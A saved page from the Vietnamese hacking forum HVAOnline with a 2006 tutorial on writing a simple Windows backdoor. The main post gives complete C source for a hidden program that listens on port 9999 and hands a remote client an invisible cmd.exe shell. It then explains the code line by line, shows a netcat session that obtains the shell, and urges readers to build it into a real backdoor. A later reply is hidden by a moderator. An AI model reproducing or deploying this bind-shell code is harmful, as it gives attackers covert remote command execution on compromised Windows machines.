<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd"> 

<html>
<head>
<meta http-equiv="Content-Type" content="text/html;charset=UTF-8">
<meta http-equiv="Pragma" content="no-cache">
<meta http-equiv="Expires" content="-1">
<meta name="description" content="HVA discussion board">
<meta name="keywords" content="Hướng dẫn viết một backdoor đơn giản trên Windows, jforum, jforum java, jforum forum, forum java, java jforum, java forum, forum, rafael steil, bulletin board, java bb, javabb, hva, hvaonline, hvazone, hvaforum">
<meta name="resource-type" content="document">
<meta name="distribution" content="global">
<meta name="robots" content="index,follow">
<meta name="rating" content="general">
<style type="text/css">
<!-- 
@import url( "http://www.hvaonline.net/hvaonline/templates/viet/styles/style.css");
-->
</style>
<style type="text/css">
<!--
@import url("http://www.hvaonline.net/hvaonline/templates/viet/styles/en_US.css");
-->
</style>
<title>Hướng dẫn viết một backdoor đơn giản trên Windows - .:: HVAOnline ::.</title>

</head>
<body class="en_US">


<!--
Original theme from phpBB (http://www.phpbb.com) subSilver
Created by subBlue design
http://www.subBlue.com
Modifications by JForum Team 
Extended and customised by HVA Team
Added more features and Black Silver theme designed by HVA
-->
<table width="100%" border="0" cols="2">
	<tr align="right">
		<td class="copyright">
			English
			| 
			<a href="/hvaonline/jforum.html?module=forums&amp;action=setLang&amp;lang=vi_VN" rel="nofollow">Vietnamese</a>
		</td>
	</tr>
</table>
<table width="100%" border="0">
	<tr>
		<td>
			<table cellspacing="0" cellpadding="0" width="100%" border="0">
				<tr>			
        <td>&nbsp;
			</td>
		
        <td width="100%" align="center" valign="middle">
						<p><a href="http://www.hvaonline.net" title="[Logo]">
								<img src="http://www.hvaonline.net/hvaonline/templates/viet/images/hvabanner-final.gif" alt="banner" />
							<br>
            				</a><span class="maintitle"></span>
						</p>
          <table cellspacing="0" cellpadding="2" border="0">
							<tr>
								
              <td valign="top" nowrap="nowrap" align="center">
			  						<a href="/hvaonline/forums/rule.html"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_rule.gif" alt="[Rule]" title="[Rule]"></a>
									<a id="rule" class="topmenu" href="/hvaonline/forums/rule.html">Rules</a>&nbsp;
									
									<a class="topmenu" href="/hvaonline/forums/list.html"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_groups.gif" alt="[Home]" title="[Home]"></a>
										<a id="backtosite" class="topmenu" href="/hvaonline/forums/list.html">Main Forum</a>&nbsp;

										<a class="topmenu" href="/hvaonline/portal/list.html"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_portal.gif" alt="[Portal]" title="[Portal]"></a>
										<a id="portalsite" class="topmenu" href="/hvaonline/portal/list.html">Portal</a>&nbsp;&nbsp;
									<br>
									
										<a href="/hvaonline/user/list.html"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_members.gif" alt="[Members]" title="[Members]"></a>
										<a id="users" class="topmenu" href="/hvaonline/user/list.html">Member Listing</a>&nbsp;
										
										<a href="/hvaonline/forums/stats.html"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_stats.gif" alt="[Statistics]" title="[Statistics]"></a>
										<a id="stats" class="topmenu" href="/hvaonline/forums/stats.html">Statistics</a>&nbsp;
										
										<a href="/hvaonline/search/filters.html"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_search.gif" alt="[Search]" title="[Search]"></a>
										<span class="mainmenu"><a id="search" class="topmenu" href="/hvaonline/search/filters.html"><b>Search</b></a>&nbsp;
									
										<a href="/book/"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_book.gif" alt="[Reading Room]" title="[Reading Room]"></a> 
										<a class="topmenu" href="/hvaonline/readingRoom/list.html">Reading Room</a>&nbsp;

									
									<span class="topmenu"> 
										

	
										<br>
											<a id="register" class="topmenu" href="/hvaonline/user/insert.html"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_register.gif" border="0" alt="[Register]" title="[Register]"> 
												Register</a>&nbsp;&nbsp;</span>
											<img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_login.gif" border="0" alt="[Login]" title="[Login]"> 
											<strong>Login</strong> [&nbsp;
											<a id="login" class="topmenu" href="/hvaonline/user/login.html">http</a>&nbsp;
											|
											<a id="logins" class="topmenu" href="https://www.hvaonline.net/hvaonline/user/logins.html">https </a>&nbsp;]</span>
								</td>
							</tr>
							<tr>
								<td>&nbsp;</td>
							</tr>
						</table>
					</td>
				</tr>
			</table>
		</td>
	</tr>
	<tr>
		<td>

<!-- navigator -->
<table cellspacing="2" cellpadding="2" width="100%" border="0" align="center">
	<tr>
		<td valign="baseline" align="left" colspan="0">
			<span class="nav">
			<a class="nav" href="/hvaonline/forums/list.html">Forum Index </a> 
			<img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif"> <a class="nav" href="/hvaonline/forums/show/12.html">Thảo luận thâm nhập </a>
			<img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif"> <a class="nav" href="/hvaonline/posts/list/5516.html" name="top" id="top">Hướng dẫn viết một backdoor đơn giản trên Windows</a>
				&nbsp;<a href="/hvaonline/rss/topicPosts/5516.html"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/xml_button.gif" border="0" alt="XML"></a>
			</span>
		
		</td>

		<td valign="middle" align="right" class="nav"></td>
	</tr>
</table>

<!-- poll show -->

  <!-- POST LISTING -->


<table cellspacing="0" cellpadding="0" width="100%" align="center" border="1">
	<table cellspacing="0" cellpadding="3" width="100%" align="center" border="0">
      <tr>

		

		<th nowrap="nowrap" class="thright" height="20" valign="middle" align="left">&nbsp;&nbsp;<span class="posttype"><font color="#FF3333">[Article]</font></span>&nbsp;&nbsp; Hướng dẫn viết một backdoor đơn giản trên Windows<a name="32372" id="32372"></a></th>
        <th class="thleft" nowrap="nowrap" width="300" height="20" valign="middle" align="right">24/12/2006 01:17:51 (+0700) | <a href="/hvaonline/posts/list/5516.html#32372">#1</a> | 32372 </th>
		
      </tr>
	</table>

	<table cellspacing="0" cellpadding="3" width="100%" align="center" border="0">
      <tr> 
		<!-- Username & profile -->
          	<td class="rowButton" valign="top">
<table cellspacing="3" cellpadding="3" width="100%" align="left" border="0">
<tr>

<td align="left">
<span class="uprofile"><a href="/hvaonline/user/profile/332.html"><b>seamoun</b></a><br>
	<font color="#CC6666">Advisor</font></span>
<br>

<span class="uprofile">
		
</span>

<!-- --></td>
	<td align="left" class="gen" width="180">
		Joined: 04/01/2002 14:05:10<br>
		Messages: 357<br>
	
	
	
			<span class="offline">Offline </span>
	<br>
<table cellspacing="0" cellpadding="0" border="0" width="100%">
  <tr>
	<td valign="middle" nowrap="nowrap"> 
		<a href="/hvaonline/user/profile/332.html" class="icon_profile"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/icon_profile.gif" alt="[Profile]" title="[Profile]"></a>
		<a href="/hvaonline/pm/sendTo/332.html" class="icon_pm"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/icon_pm.gif" alt="[PM]" title="[PM]"></a>

		
		
		
		
	</td>
</tr>
  <tr>
    <td valign="middle" nowrap="nowrap">
	
</td>
  </tr>
</table>
	</td>
</tr>
</table>
</td>
      </tr>
	</table>
	
	<table cellspacing="1" cellpadding="3" width="100%" align="center" border="0">
      <tr>
        <!-- Message -->
        <td colspan="2" valign="top" class="row1">
				<!-- should view editeBy or not -->
			  <!-- which to view -->
                <table cellspacing="3" cellpadding="3" width="100%" align="center" border="0">
                  <tr>
                    <td valign="top" class="row1"><span class="postbody">Nguyên tắc là cách làm việc của backdoor không giải thích các bạn cũng biết nó gì và cách sử dụng chúng như nào. Một khi backdoor được cài lên giúp kẻ tấn công sẽ thuận tiện hơn khi trở lại server mà mình đã tấn công vào, điều mà chúng ta cần biết là cách viết đổ cmd.exe tử backdoor (tức là kẻ tấn công có shell khi đã có backdoor được cài trên server) như thế nào ?<br/> <br/> Đoạn mã viết dưới đây không phải là backdoor mà chỉ đơn thuần là một phần công việc của backdoor. Sau đây mình sẽ hướng dẫn cách viết đổ cmd.exe như thế nào ?<br/> <br/> <span class="quotetxt"><b>Code:</b></span><br/>
		<div class="coded"">
		<pre>#include &lt;windows.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

#define PORT 9999	//&lt;--Dat cong lang nghe la 9999
#define BANNER	"Seamoun &#40;http://nhomvicki.net&#41; - TcpShell 1.0\n"
#define	MAXRECVBUF	1000	//Bo dem toi da khi nhan
#define MAXPIPEBUF	1000	//Bo dem toi da cua pipe
#define WM_SHELL	WM_USER+1	//Tinh huong tu dinh nghia

#define	MyClass	"Seamoun"	//Ten lop
#define MyApp	"Seamoun"	//Ten ung dung

#pragma comment&#40;lib,"wsock32.lib"&#41;	//Gop thu vien wsock32.lib


HANDLE	hThread_out;	
DWORD	dwChildThreadIdOut;
SECURITY_ATTRIBUTES	sa;	
STARTUPINFO	si;
PROCESS_INFORMATION pi;
HANDLE	hPipeOutputRead,hPipeOutputWrite,hPipeInputRead,hPipeInputWrite;
BOOL	NowUsing;

int	sock_listen,sock;
sockaddr_in	addrServer;


void GetShell &#40;HWND hwnd,WPARAM wParam,LPARAM lParam&#41;;
int	WndProc&#40;HWND hwnd,UINT msg,WPARAM wParam,LPARAM lParam&#41;;
DWORD	__stdcall OutSocket&#40;LPVOID lpData&#41;;

int	__stdcall WinMain&#40;HINSTANCE hInstance,HINSTANCE hPrevInstance,LPSTR lpCmdLine,int nShowCmd&#41;
{
	HWND hwnd;
	MSG	 msg;

	WNDCLASSEX wc;
	wc.cbClsExtra=0;
	wc.cbSize=sizeof&#40;wc&#41;;
	wc.cbWndExtra=0;
	wc.hbrBackground=&#40;HBRUSH&#41;COLOR_WINDOW;
	wc.hCursor=LoadCursor&#40;NULL,IDC_ARROW&#41;;
	wc.hIcon=LoadIcon&#40;NULL,IDI_APPLICATION&#41;;
	wc.hIconSm=0;
	wc.hInstance=hInstance;
	wc.lpfnWndProc=&#40;WNDPROC&#41;WndProc;
	wc.lpszClassName=MyClass;
	wc.lpszMenuName=0;
	wc.style=CS_HREDRAW|CS_VREDRAW;

	RegisterClassEx&#40;&wc&#41;;
	hwnd=CreateWindowEx&#40;NULL,MyClass,MyApp,WS_OVERLAPPEDWINDOW,0,0,0,0,NULL,NULL,hInstance,NULL&#41;;
	ShowWindow&#40;hwnd,SW_HIDE&#41;;
	UpdateWindow&#40;hwnd&#41;;

	while &#40;GetMessage&#40;&msg,0,0,0&#41;&#41;
	{
		TranslateMessage&#40;&msg&#41;;
		DispatchMessage&#40;&msg&#41;;
	}

	return msg.wParam;
}

int	WndProc&#40;HWND hwnd,UINT msg,WPARAM wParam,LPARAM lParam&#41;
{
	WSADATA	wsaData;
	switch&#40;msg&#41;
	{
	case WM_CREATE:
		if &#40;WSAStartup&#40;MAKEWORD&#40;1,1&#41;,&wsaData&#41;!=0&#41; return -1;
		if &#40;&#40;sock_listen=socket&#40;AF_INET,SOCK_STREAM,0&#41;&#41;==INVALID_SOCKET&#41; return -1;
		
		addrServer.sin_family=AF_INET;
		addrServer.sin_port=htons&#40;PORT&#41;;
		addrServer.sin_addr.s_addr=htonl&#40;INADDR_ANY&#41;;
		memset&#40;&addrServer.sin_zero,'\0',8&#41;;
		if &#40;bind&#40;sock_listen,&#40;struct sockaddr *&#41;&addrServer,sizeof&#40;addrServer&#41;&#41;==SOCKET_ERROR&#41; return -1;
		if &#40;listen&#40;sock_listen,1&#41;==SOCKET_ERROR&#41; return -1;
		if &#40;WSAAsyncSelect&#40;sock_listen,hwnd,WM_SHELL,
			FD_CLOSE|FD_ACCEPT|FD_READ|FD_WRITE&#41;==SOCKET_ERROR&#41; return -1;
		NowUsing=FALSE;
		break;
	case WM_CLOSE:
		PostQuitMessage&#40;wParam&#41;;
		break;
	case WM_SHELL:
		GetShell&#40;hwnd,wParam,lParam&#41;;
	default:
		return &#40;DefWindowProc&#40;hwnd,msg,wParam,lParam&#41;&#41;;
	}
	return 0;
}
void GetShell &#40;HWND hwnd,WPARAM wParam,LPARAM lParam&#41;
{
	long lEvent=WSAGETSELECTEVENT&#40;lParam&#41;;
	static char buf&#91;MAXRECVBUF&#93;;
	DWORD	dwNumberOfBytesWrite;
	int	sock_tmp;
	UINT	r;
	sockaddr_in	addrClient;
	int	sizeClient=sizeof&#40;addrClient&#41;;
	if &#40;lEvent==FD_ACCEPT&#41;
	{
		if &#40;&#40;sock_tmp=accept&#40;sock_listen,&#40;struct sockaddr *&#41;&addrClient,&sizeClient&#41;&#41;==INVALID_SOCKET&#41; 
			 if &#40;WSAGetLastError&#40;&#41;!=WSAEWOULDBLOCK&#41; return;
		
		if &#40;NowUsing==TRUE&#41;
		{
			closesocket&#40;sock_tmp&#41;;
			return;
		}
		sock=sock_tmp;
		send&#40;sock,BANNER,strlen&#40;BANNER&#41;,0&#41;;
		NowUsing=TRUE;

		sa.nLength=sizeof&#40;sa&#41;;
		sa.lpSecurityDescriptor=0;
		sa.bInheritHandle=TRUE;

		CreatePipe&#40;&hPipeOutputRead,&hPipeOutputWrite,&sa,5000&#41;;
		CreatePipe&#40;&hPipeInputRead,&hPipeInputWrite,&sa,5000&#41;;

		memset&#40;&#40;void *&#41;&si,'\0',sizeof&#40;si&#41;&#41;;
		memset&#40;&#40;void *&#41;&pi,'\0',sizeof&#40;pi&#41;&#41;;

		si.cb=sizeof&#40;si&#41;;
		si.dwFlags=STARTF_USESHOWWINDOW|STARTF_USESTDHANDLES;
		si.wShowWindow=SW_HIDE;
		si.hStdInput=hPipeInputRead;
		si.hStdOutput=hPipeOutputWrite;
		si.hStdError=hPipeOutputWrite;

		CreateProcess&#40;NULL,TEXT&#40;"cmd.exe"&#41;,NULL,NULL,TRUE,0,NULL,TEXT&#40;"c:\\"&#41;,&si,&pi&#41;;

		CloseHandle&#40;hPipeInputRead&#41;;
		CloseHandle&#40;hPipeOutputWrite&#41;;

		hThread_out=CreateThread&#40;NULL,0,OutSocket,NULL,NULL,&dwChildThreadIdOut&#41;;
		return;
	}
	else if &#40;lEvent==FD_CLOSE&#41;
	{
		closesocket&#40;sock&#41;;
		TerminateProcess&#40;pi.hProcess,0&#41;;
		TerminateThread&#40;hThread_out,0&#41;;
		CloseHandle&#40;pi.hProcess&#41;;
		CloseHandle&#40;hPipeOutputRead&#41;;
		CloseHandle&#40;hPipeInputWrite&#41;;
		NowUsing=FALSE;
	}
	if &#40;&#40;r=recv&#40;sock,buf,MAXRECVBUF,0&#41;&#41;==SOCKET_ERROR&#41; return;
	buf&#91;r&#93;=0;
	WriteFile&#40;hPipeInputWrite,&buf,r,&dwNumberOfBytesWrite,NULL&#41;;
}
DWORD	__stdcall OutSocket&#40;LPVOID lpData&#41;
{
	char szBuffer&#91;MAXPIPEBUF&#93;;
	DWORD	dwNumberOfBytesRead;
	for &#40;;;&#41;
	{
		if &#40;ReadFile&#40;hPipeOutputRead,&szBuffer,MAXPIPEBUF,&dwNumberOfBytesRead,NULL&#41;==FALSE&#41; continue;
		if &#40;dwNumberOfBytesRead&lt;=0&#41; continue;
		FlushFileBuffers&#40;hPipeOutputRead&#41;;
		szBuffer&#91;dwNumberOfBytesRead&#93;=0;
		send&#40;sock,szBuffer,dwNumberOfBytesRead,0&#41;;
	}
	return 0;
}</pre>
		</div><br/> <br/> Với đoan mã trên thì phần đăng kí và tạo ra window thì đơn giản, các bạn có thể tham khảo cách lập trình C trên Windows. Để khỏi dài dòng mình chỉ nói phần đổ cmd.exe như thế nào mà thôi !<br/> 1) Trong tình huống WM_CREATE (tức là khi đang tạo Windows) chúng ta có đoạn mã sau:<br/> 	<br/> 	<span class="quotetxt"><b>Code:</b></span><br/>
		<div class="coded"">
		<pre>if &#40;WSAStartup&#40;MAKEWORD&#40;1,1&#41;,&wsaData&#41;!=0&#41; return -1;//&lt;-- Khởi tạo thư viện winsocket
	if &#40;&#40;sock_listen=socket&#40;AF_INET,SOCK_STREAM,0&#41;&#41;==INVALID_SOCKET&#41; return -1; //&lt;--Tạo socket listen
	//Định nghĩa giá trị cho biến cấu trúc sockaddr_in addrServer
	addrServer.sin_family=AF_INET;	
	addrServer.sin_port=htons&#40;PORT&#41;;
	addrServer.sin_addr.s_addr=htonl&#40;INADDR_ANY&#41;;
	memset&#40;&addrServer.sin_zero,'\0',8&#41;;
	//--------------------------------------------------------------------
	if &#40;bind&#40;sock_listen,&#40;struct sockaddr *&#41;&addrServer,sizeof&#40;addrServer&#41;&#41;==SOCKET_ERROR&#41; return -1;//Bind socket listen
	if &#40;listen&#40;sock_listen,1&#41;==SOCKET_ERROR&#41; return -1;	//&lt;-- Đặt chế độ lắng nghe

	//Tạo những tình huống riêng &#40;ở đây mình lấy tên tình huống riêng là WM_SHELL các bạn có thể lấy tên khác tùy ý miễn là nó được định nghĩa WM_USER +x&#41;
	if &#40;WSAAsyncSelect&#40;sock_listen,hwnd,WM_SHELL,
		FD_CLOSE|FD_ACCEPT|FD_READ|FD_WRITE&#41;==SOCKET_ERROR&#41; return -1;

	NowUsing=FALSE;	//&lt;--Đây đơn giản là biến dùng để đánh dấu socket đang dùng hay là không dùng nữa</pre>
		</div><br/> 2) Giải thích mã của hai hàm GetShell và OutSocket<br/> <span class="quotetxt"><b>Code:</b></span><br/>
		<div class="coded"">
		<pre>a&#41; Hàm GetShell &#40;HWND hwnd,WPARAM wParam,LPARAM lParam&#41;
	long lEvent=WSAGETSELECTEVENT&#40;lParam&#41;;	//&lt;--Lấy sự kiện
	static char buf&#91;MAXRECVBUF&#93;;	//Khai báo biến buf để
	DWORD	dwNumberOfBytesWrite;	//
	int	sock_tmp;	//&lt;--Khai báo một socket trung gian
	UINT	r;
	sockaddr_in	addrClient;
	int	sizeClient=sizeof&#40;addrClient&#41;;
	//Khi có kết nối đến từ máy client - Ở đây kết nối được chấp nhận và sử lý như sau
	if &#40;lEvent==FD_ACCEPT&#41;
	{
		if &#40;&#40;sock_tmp=accept&#40;sock_listen,&#40;struct sockaddr *&#41;&addrClient,&sizeClient&#41;&#41;==INVALID_SOCKET&#41; 
			 if &#40;WSAGetLastError&#40;&#41;!=WSAEWOULDBLOCK&#41; return;

		//Nếu như đang sử dụng thì đóng socket này lại	
		if &#40;NowUsing==TRUE&#41;
		{
			closesocket&#40;sock_tmp&#41;;
			return;
		}
		
		sock=sock_tmp;
		send&#40;sock,BANNER,strlen&#40;BANNER&#41;,0&#41;;
		NowUsing=TRUE;

		sa.nLength=sizeof&#40;sa&#41;;
		sa.lpSecurityDescriptor=0;
		sa.bInheritHandle=TRUE;
		
		//Tạo hai ống dẫn dùng để đổ cmd.exe. Một ống dùng để nhận lệnh từ client gửi đến và một ống dùng để xuất kết quả trả về cho client

		CreatePipe&#40;&hPipeOutputRead,&hPipeOutputWrite,&sa,5000&#41;;
		CreatePipe&#40;&hPipeInputRead,&hPipeInputWrite,&sa,5000&#41;;

		memset&#40;&#40;void *&#41;&si,'\0',sizeof&#40;si&#41;&#41;;
		memset&#40;&#40;void *&#41;&pi,'\0',sizeof&#40;pi&#41;&#41;;
		//Khởi tạo một số thông số cho biến cấu trúc si &#40;Startup Information: thông tin khởi động&#41;
		si.cb=sizeof&#40;si&#41;;
		si.dwFlags=STARTF_USESHOWWINDOW|STARTF_USESTDHANDLES;
		si.wShowWindow=SW_HIDE;
		si.hStdInput=hPipeInputRead;
		si.hStdOutput=hPipeOutputWrite;
		si.hStdError=hPipeOutputWrite;

//Tạo một tiến trình mới. Mà ở đây là chạy cmd.exe		CreateProcess&#40;NULL,TEXT&#40;"cmd.exe"&#41;,NULL,NULL,TRUE,0,NULL,TEXT&#40;"c:\\"&#41;,&si,&pi&#41;;

		CloseHandle&#40;hPipeInputRead&#41;;
		CloseHandle&#40;hPipeOutputWrite&#41;;
		//Tạo luồng trong tiến trình mới với mục đích là đọc ghi dữ liệu
		hThread_out=CreateThread&#40;NULL,0,OutSocket,NULL,NULL,&dwChildThreadIdOut&#41;;
		return;
	}
	else if &#40;lEvent==FD_CLOSE&#41;
	{
	//Đóng tất các các handle khi xuất hiện tình huống FD_CLOSE
		closesocket&#40;sock&#41;;
		TerminateProcess&#40;pi.hProcess,0&#41;;
		TerminateThread&#40;hThread_out,0&#41;;
		CloseHandle&#40;pi.hProcess&#41;;
		CloseHandle&#40;hPipeOutputRead&#41;;
		CloseHandle&#40;hPipeInputWrite&#41;;
		NowUsing=FALSE;
	}
	if &#40;&#40;r=recv&#40;sock,buf,MAXRECVBUF,0&#41;&#41;==SOCKET_ERROR&#41; return;
	buf&#91;r&#93;=0;
	//Nhận dữ liệu từ client và ghi đến CMD.EXE
	WriteFile&#40;hPipeInputWrite,&buf,r,&dwNumberOfBytesWrite,NULL&#41;;
}</pre>
		</div><br/> 3) Giải thích mã hàm OutSocket<br/> <span class="quotetxt"><b>Code:</b></span><br/>
		<div class="coded"">
		<pre>DWORD	__stdcall OutSocket&#40;LPVOID lpData&#41;
{
	char szBuffer&#91;MAXPIPEBUF&#93;;
	DWORD	dwNumberOfBytesRead;
	//Tạo vòng lặp vô tận để nhận kết quả trả về từ CMD.EXE
	for &#40;;;&#41;
	{
		if &#40;ReadFile&#40;hPipeOutputRead,&szBuffer,MAXPIPEBUF,&dwNumberOfBytesRead,NULL&#41;==FALSE&#41; continue;
		if &#40;dwNumberOfBytesRead&lt;=0&#41; continue;
		FlushFileBuffers&#40;hPipeOutputRead&#41;;
		szBuffer&#91;dwNumberOfBytesRead&#93;=0;	//&lt;-- Thêm kí tự kết thúc chuỗi trong dữ liệu trả về
		//Hiển thị kết quả CMD.EXE trả về ra màn hình client
		send&#40;sock,szBuffer,dwNumberOfBytesRead,0&#41;;
	}
	return 0;
}</pre>
		</div><br/> <br/> Biên dịch đoạn mã trên và thực thi nó sẽ có kết quả như sau:<br/> tcpshell sẽ lắng nghe trên cổng 9999. Chúng ta kết nối đến cổng 9999 bằng netcat để xem tcpshell đổ cmd.exe như thế nào<br/> <br/> <span class="quotetxt"><b>Code:</b></span><br/>
		<div class="coded"">
		<pre>d:\&gt;nx -vv -n 10.0.0.1 9999
&#40;UNKNOWN&#41; &#91;10.0.0.1&#93; 9999 &#40;?&#41; open
Seamoun &#40;http://nhomvicki.net&#41; - TcpShell 1.0
Microsoft Windows 2000 &#91;Version 5.00.2195&#93;
&#40;C&#41; Copyright 1985-2000 Microsoft Corp.

c:\&gt;	&lt;--- Vậy là đã có shell</pre>
		</div><br/> <br/> Sau bài này các bạn có thể phát triển tiếp cho mã trên trở thành một con backdoor thực sự !<br/> <br/> Bài này mình viết lâu roài. Đã post lên HVA rồi mà hổng biết sao tìm hổng thấy bài này nên mình post lại  <img src="/hvaonline/images/smilies/5e3ee5fb831b15dfe0bb63a8d0c6a93e.gif" border="0" alt="smilie" align="absbottom"> </span></td>
                  </tr>
                </table>
          <!-- Attachments -->
			  		</td>
      </tr>

		  <tr>
			<td height="20" colspan="2" valign="bottom" class="rowButton"><span class="gensmall">--vickigroup.com--</span></td>
		  </tr>

			<tr>
		        <td valign="bottom" class="row1" align="center"><div class="action" align="center">
	<table width="100%" border="0">
  		<tr>
		<td align="left">
					</td>
		<td align="right">
			<!--  -->
			
		


		
		
		<a class="nav" href="#top"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/icon_up.gif" alt="[Up]" title="[Up]"></a>
			<img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/icon_print.gif" alt="[Print Copy]" title="[Print Copy]"></a>
		</td>
  	</tr>
	</table>
</div></td>
		  </tr>
	</table>

<table cellspacing="0" cellpadding="0" width="100%" align="center" border="0">
	<tr>
    	<td class="catbottomslim" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="5"></td>
  	</tr>
	<tr>
		<td><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="20"></td>
	</tr>
</table>

		


<table cellspacing="0" cellpadding="0" width="100%" align="center" border="1">
	<table cellspacing="0" cellpadding="3" width="100%" align="center" border="0">
      <tr>

		

		<th nowrap="nowrap" class="thright" height="20" valign="middle" align="left">&nbsp;&nbsp;<span class="posttype"><font color="#FF3333">[Article]</font></span>&nbsp;&nbsp; Hướng dẫn viết một backdoor đơn giản trên Windows<a name="263590" id="263590"></a></th>
        <th class="thleft" nowrap="nowrap" width="300" height="20" valign="middle" align="right">20/05/2012 07:50:26 (+0700) | <a href="/hvaonline/posts/list/5516.html#263590">#2</a> | 263590 </th>
		
      </tr>
	</table>

	<table cellspacing="0" cellpadding="3" width="100%" align="center" border="0">
      <tr> 
		<!-- Username & profile -->
          	<td class="rowButton" valign="top">
<table cellspacing="3" cellpadding="3" width="100%" align="left" border="0">
<tr>

<td align="left">
<span class="uprofile"><a href="/hvaonline/user/profile/207063.html"><b>luongkma</b></a><br>
	<font color="#CCCCCC">Member</font></span>
<br>

<span class="uprofile">
		
</span>
	<table cellspacing="0" cellpadding="0" border="0" width="20" height="8">
		<tr>
			<td>
				<img src="http://www.hvaonline.net/hvaonline/templates/viet/images/minus.gif" alt="[Minus]" title="[Minus]"></a>	</td>
			<td height="4" width="16">
				<span class="warn">&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;</span>	</td>
			<td>
				<img src="http://www.hvaonline.net/hvaonline/templates/viet/images/plus.gif" alt="[Plus]" title="[Plus]"></a>
			</td>
		</tr>
	</table>

<!-- --></td>
	<td align="left" class="gen" width="180">
		Joined: 13/10/2009 18:35:19<br>
		Messages: 13<br>
	
	
	
			<span class="offline">Offline </span>
	<br>
<table cellspacing="0" cellpadding="0" border="0" width="100%">
  <tr>
	<td valign="middle" nowrap="nowrap"> 
		<a href="/hvaonline/user/profile/207063.html" class="icon_profile"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/icon_profile.gif" alt="[Profile]" title="[Profile]"></a>
		<a href="/hvaonline/pm/sendTo/207063.html" class="icon_pm"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/icon_pm.gif" alt="[PM]" title="[PM]"></a>

		
		
		
		
	</td>
</tr>
  <tr>
    <td valign="middle" nowrap="nowrap">
	
</td>
  </tr>
</table>
	</td>
</tr>
</table>
</td>
      </tr>
	</table>
	
	<table cellspacing="1" cellpadding="3" width="100%" align="center" border="0">
      <tr>
        <!-- Message -->
        <td colspan="2" valign="top" class="row2">
				<!-- should view editeBy or not -->
			  <!-- which to view -->
                <table cellspacing="3" cellpadding="3" width="100%" align="center" border="0">
                  <tr>
                    <td valign="top" class="row4"><span class="size18">This post is set hidden by a moderator because it may be violating forum's guideline or it needs modification before setting visible to members.</span></td>
                  </tr>
                </table>
          <!-- Attachments -->
			  		</td>
      </tr>


			<tr>
		        <td valign="bottom" class="row1" align="center"><div class="action" align="center">
	<table width="100%" border="0">
  		<tr>
		<td align="left">
					</td>
		<td align="right">
			<!--  -->
			
		


		
		
		<a class="nav" href="#top"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/icon_up.gif" alt="[Up]" title="[Up]"></a>
			<img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/icon_print.gif" alt="[Print Copy]" title="[Print Copy]"></a>
		</td>
  	</tr>
	</table>
</div></td>
		  </tr>
	</table>

<table cellspacing="0" cellpadding="0" width="100%" align="center" border="0">
	<tr>
    	<td class="catbottomslim" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="5"></td>
  	</tr>
	<tr>
		<td><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="20"></td>
	</tr>
</table>

		

<table cellspacing="0" cellpadding="0" width="100%" border="0" align="center">
	<tr>
		<td valign="middle" align="right" class="nav"></td>
	</tr>
</table>

<!-- quick reply -->
<table class="forumline" cellspacing="1" cellpadding="3" width="100%" border="0" align="center">
</table>

<table cellspacing="0" cellpadding="0" width="100%" border="0" align="center">
	<tr>
		<td><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="10"></td>
	</tr>
</table>

<table cellspacing="0" cellpadding="0" width="100%" border="0" align="center">
	<tr>
		<td align="left">
			<!-- watch - unwatch -->
			<!-- add bookmark -->

		</td>
		<td align="right" valign="bottom">			
		</td>
	</tr>
</table>

<!-- mod -->

<table cellspacing="0" cellpadding="0" width="100%" border="0" align="center">
	<tr>
		<td colspan="3"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="10"></td>
	</tr>
</table>

<!-- combo navigator -->
<table cellspacing="0" cellpadding="0" width="100%" border="0" align="center">
	<tr>
		<td align="left"><a href="http://digg.com/submit?phrase=2&url=http://www.hvaonline.net/hvaonline/posts/list/5516.html"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/digg.gif" align="texttop" alt="[digg]" title="[digg]"></a>
<a href="http://del.icio.us/post?url=http://www.hvaonline.net/hvaonline/posts/list/5516.html"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/delicious.gif" align="texttop" alt="[delicious]" title="[delicious]"></a>
<a href="http://www.google.com/bookmarks/mark?op=edit&output=popup&bkmk=http://www.hvaonline.net/hvaonline/posts/list/5516.html"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/google.gif" align="texttop" alt="[google]" title="[google]"></a>
<a href="http://bookmarks.yahoo.com/toolbar/savebm?opener=tb&u=http://www.hvaonline.net/hvaonline/posts/list/5516.html"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/yahoo.gif" align="texttop" alt="[yahoo]" title="[yahoo]"></a>
